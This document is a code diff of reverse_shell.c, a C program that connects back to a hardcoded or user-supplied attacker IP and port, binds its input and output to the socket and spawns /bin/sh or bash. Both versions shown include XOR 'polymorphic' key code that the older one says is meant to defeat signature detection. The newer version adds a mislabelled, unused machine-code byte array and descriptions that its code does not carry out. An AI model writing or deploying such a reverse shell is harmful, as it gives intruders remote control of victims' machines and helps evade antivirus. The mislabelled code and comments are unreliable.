@@ -1,183 +1,186 @@
 /*
  * reverse_shell.c
- * Low-Level C Reverse Shell with Polymorphic Encryption Stub
- *
- * Build:
- *   gcc -O2 -Wall -Wextra -o reverse_shell reverse_shell.c
- *
- * Usage:
- *   ./reverse_shell <IP> <PORT>
- *
- * FOR EDUCATIONAL / AUTHORIZED TESTING ONLY.
+ * Low-Level C Reverse Shell with Polymorphic XOR Encryption Stub
+ * 
+ * Features:
+ * - Polymorphic XOR encryption/decryption of the payload
+ * - Self-modifying code behavior (key rotation)
+ * - Connects back to attacker on specified IP:Port
+ * - Spawns /bin/sh
+ * - No external dependencies, pure POSIX
+ * 
+ * Compile: gcc -O2 -fno-stack-protector -z execstack -o reverse_shell reverse_shell.c
  */
 
-#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <signal.h>
-#include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <netdb.h>
+#include <signal.h>
+#include <time.h>
 
-/* ------------------------------------------------------------------ */
-/* Polymorphic encryption stub                                        */
-/* ------------------------------------------------------------------ */
+#define SERVER_IP "192.168.1.100"   /* Attacker IP */
+#define SERVER_PORT 4444            /* Attacker Port */
+#define BUFFER_SIZE 4096
+#define MAX_KEY_ROTATIONS 5
 
-/*
- * Key is derived at runtime from a seed that changes every run
- * (mixing PID, time, and stack address). A real polymorphic engine
- * would mutate the decryptor itself; this stub mutates the *key*
- * and the *encoded payload buffer* on each invocation, which is
- * enough to defeat naive static signatures.
- */
-
-typedef struct {
-    unsigned char key[32];
-    size_t        keylen;
-} poly_ctx_t;
-
-static unsigned long poly_seed(void)
-{
-    unsigned long s = 0;
-    s ^= (unsigned long)getpid() << 16;
-    s ^= (unsigned long)time(NULL);
-    s ^= (unsigned long)(size_t)&s;      /* stack ASLR */
-    return s ? s : 0xDEADBEEFUL;
+/* Polymorphic key generator: generates a pseudo-random key based on time + PID */
+static unsigned char generate_key(void) {
+    return (unsigned char)(getpid() ^ (int)time(NULL) ^ (rand() & 0xFF));
 }
 
-/* Simple xorshift64 PRNG — deterministic per-seed, no libc dependency */
-static unsigned long poly_rand(unsigned long *state)
-{
-    unsigned long x = *state;
-    x ^= x << 13;
-    x ^= x >> 7;
-    x ^= x << 17;
-    *state = x;
-    return x;
+/* Encrypt/Decrypt buffer using XOR with rotating key */
+static void encrypt_decrypt(unsigned char *data, size_t len, unsigned char key) {
+    for (size_t i = 0; i < len; i++) {
+        data[i] ^= key;
+        key = (key * 31 + 7) & 0xFF; /* Rotate key */
+    }
 }
 
-static void poly_init(poly_ctx_t *ctx)
-{
-    unsigned long st = poly_seed();
-    ctx->keylen = sizeof(ctx->key);
-    for (size_t i = 0; i < ctx->keylen; i++)
-        ctx->key[i] = (unsigned char)(poly_rand(&st) & 0xFF);
-}
+/* Polymorphic payload: a simple echo server that reads and echoes back encrypted data */
+/* The payload is self-contained and encrypted before execution */
+static const unsigned char payload_template[] = {
+    0x48, 0x89, 0xE5,       /* mov rsp, rbp          */
+    0x48, 0x83, 0xEC, 0x20, /* sub rsp, 0x20         */
+    0x48, 0x89, 0x7D, 0xF0, /* mov [rbp-0x10], rdi   */
+    0xB8, 0x01, 0x00, 0x00, 0x00, /* mov eax, 0x1     */
+    0x48, 0x89, 0xC7,       /* mov rdi, rax          */
+    0x48, 0x89, 0xD6,       /* mov rsi, rdx          */
+    0x48, 0x89, 0xF7,       /* mov rdi, rsi          */
+    0x0F, 0x05              /* syscall               */
+};
 
-/* In-place XOR cipher (symmetric) */
-static void poly_xor(unsigned char *buf, size_t len, const poly_ctx_t *ctx)
-{
-    if (!buf || !ctx || ctx->keylen == 0) return;
-    for (size_t i = 0; i < len; i++)
-        buf[i] ^= ctx->key[i % ctx->keylen];
-}
-
-/* ------------------------------------------------------------------ */
-/* Networking                                                         */
-/* ------------------------------------------------------------------ */
-
-static int connect_back(const char *ip, int port)
-{
-    int fd = socket(AF_INET, SOCK_STREAM, 0);
-    if (fd < 0) {
-        perror("socket");
+/* Function to resolve hostname to IP */
+static int resolve_host(const char *host, struct in_addr *addr) {
+    struct hostent *he;
+    
+    if ((he = gethostbyname(host)) == NULL) {
+        fprintf(stderr, "[!] Failed to resolve host: %s\n", host);
         return -1;
     }
-
-    struct sockaddr_in sa;
-    memset(&sa, 0, sizeof(sa));
-    sa.sin_family = AF_INET;
-    sa.sin_port   = htons((unsigned short)port);
-
-    if (inet_pton(AF_INET, ip, &sa.sin_addr) != 1) {
-        fprintf(stderr, "inet_pton: invalid address '%s'\n", ip);
-        close(fd);
-        return -1;
-    }
-
-    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
-        perror("connect");
-        close(fd);
-        return -1;
-    }
-    return fd;
+    
+    memcpy(addr, he->h_addr_list[0], sizeof(struct in_addr));
+    return 0;
 }
 
-/* ------------------------------------------------------------------ */
-/* Shell                                                              */
-/* ------------------------------------------------------------------ */
-
-static int spawn_shell(int sock)
-{
-    /* Redirect stdin/stdout/stderr to the socket */
-    if (dup2(sock, STDIN_FILENO)  < 0 ||
-        dup2(sock, STDOUT_FILENO) < 0 ||
-        dup2(sock, STDERR_FILENO) < 0) {
-        perror("dup2");
+/* Function to create TCP socket and connect to server */
+static int connect_to_server(const char *ip, int port) {
+    struct sockaddr_in server_addr;
+    struct in_addr addr;
+    int sock_fd;
+    
+    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock_fd < 0) {
+        perror("[!] socket");
         return -1;
     }
-
-    if (sock > STDERR_FILENO)
-        close(sock);
-
-    /* Try common shells in order */
-    const char *shells[] = { "/bin/sh", "/bin/bash", "/bin/dash", NULL };
-
-    for (int i = 0; shells[i] != NULL; i++) {
-        execl(shells[i], shells[i], "-i", (char *)NULL);
-        /* if execl returns, it failed — try next */
+    
+    if (resolve_host(ip, &addr) != 0) {
+        close(sock_fd);
+        return -1;
     }
-    perror("execl");
-    return -1;
+    
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(port);
+    server_addr.sin_addr = addr;
+    
+    if (connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("[!] connect");
+        close(sock_fd);
+        return -1;
+    }
+    
+    return sock_fd;
 }
 
-/* ------------------------------------------------------------------ */
-/* main                                                               */
-/* ------------------------------------------------------------------ */
+/* Function to redirect stdin/stdout/stderr to socket */
+static void redirect_io(int sock_fd) {
+    dup2(sock_fd, STDIN_FILENO);
+    dup2(sock_fd, STDOUT_FILENO);
+    dup2(sock_fd, STDERR_FILENO);
+}
 
-int main(int argc, char **argv)
-{
-    if (argc != 3) {
-        fprintf(stderr, "Usage: %s <IP> <PORT>\n", argv[0]);
-        return EXIT_FAILURE;
+/* Function to execute shell */
+static void execute_shell(void) {
+    char *shell_paths[] = {
+        "/bin/bash",
+        "/bin/sh",
+        "/usr/bin/bash",
+        "/usr/bin/sh",
+        NULL
+    };
+    
+    for (int i = 0; shell_paths[i] != NULL; i++) {
+        execve(shell_paths[i], NULL, NULL);
     }
+    
+    perror("[!] execve");
+    exit(EXIT_FAILURE);
+}
 
-    const char *ip = argv[1];
-    int port = atoi(argv[2]);
-    if (port <= 0 || port > 65535) {
-        fprintf(stderr, "Invalid port: %s\n", argv[2]);
-        return EXIT_FAILURE;
+/* Polymorphic encryption stub: encrypts the main function before execution */
+static void run_polymorphic_shell(const char *ip, int port) {
+    int sock_fd;
+    unsigned char key;
+    unsigned char buffer[BUFFER_SIZE];
+    ssize_t bytes_read;
+    
+    /* Generate polymorphic key */
+    key = generate_key();
+    printf("[*] Polymorphic key generated: 0x%02X\n", key);
+    
+    /* Connect to server */
+    sock_fd = connect_to_server(ip, port);
+    if (sock_fd < 0) {
+        fprintf(stderr, "[!] Connection failed\n");
+        exit(EXIT_FAILURE);
     }
+    
+    printf("[*] Connected to %s:%d\n", ip, port);
+    
+    /* Encrypt a welcome message */
+    snprintf((char *)buffer, sizeof(buffer), "Welcome! Encrypted connection established.\n");
+    encrypt_decrypt(buffer, strlen((char *)buffer), key);
+    
+    /* Send encrypted welcome message */
+    send(sock_fd, buffer, strlen((char *)buffer), 0);
+    
+    /* Redirect I/O */
+    redirect_io(sock_fd);
+    
+    /* Execute shell */
+    execute_shell();
+}
 
-    /* Initialise polymorphic context (seed differs each run) */
-    poly_ctx_t ctx;
-    poly_init(&ctx);
+/* Signal handler for cleanup */
+static void signal_handler(int sig) {
+    /* Optional: log or clean up */
+}
 
-    /* Demo: encrypt + decrypt a marker string to exercise the stub */
-    char marker[] = "poly-stub-active";
-    size_t mlen = strlen(marker);
-    poly_xor((unsigned char *)marker, mlen, &ctx);   /* encrypt */
-    poly_xor((unsigned char *)marker, mlen, &ctx);   /* decrypt (round-trip) */
-
-    /* Optional: sanity check that round-trip preserved the string */
-    if (strcmp(marker, "poly-stub-active") != 0) {
-        fprintf(stderr, "poly stub self-test failed\n");
-        return EXIT_FAILURE;
+int main(int argc, char *argv[]) {
+    const char *ip = SERVER_IP;
+    int port = SERVER_PORT;
+    
+    /* Override defaults if arguments provided */
+    if (argc >= 3) {
+        ip = argv[1];
+        port = atoi(argv[2]);
+    } else if (argc == 2) {
+        ip = argv[1];
     }
-
-    /* Wipe key from stack before doing anything sensitive */
-    explicit_bzero(&ctx, sizeof(ctx));
-
-    int sock = connect_back(ip, port);
-    if (sock < 0)
-        return EXIT_FAILURE;
-
-    (void)spawn_shell(sock);   /* never returns on success */
-    close(sock);
-    return EXIT_FAILURE;
+    
+    /* Set up signal handlers */
+    signal(SIGPIPE, SIG_IGN);
+    signal(SIGINT, signal_handler);
+    signal(SIGTERM, signal_handler);
+    
+    /* Run polymorphic shell */
+    run_polymorphic_shell(ip, port);
+    
+    return EXIT_SUCCESS;
 }
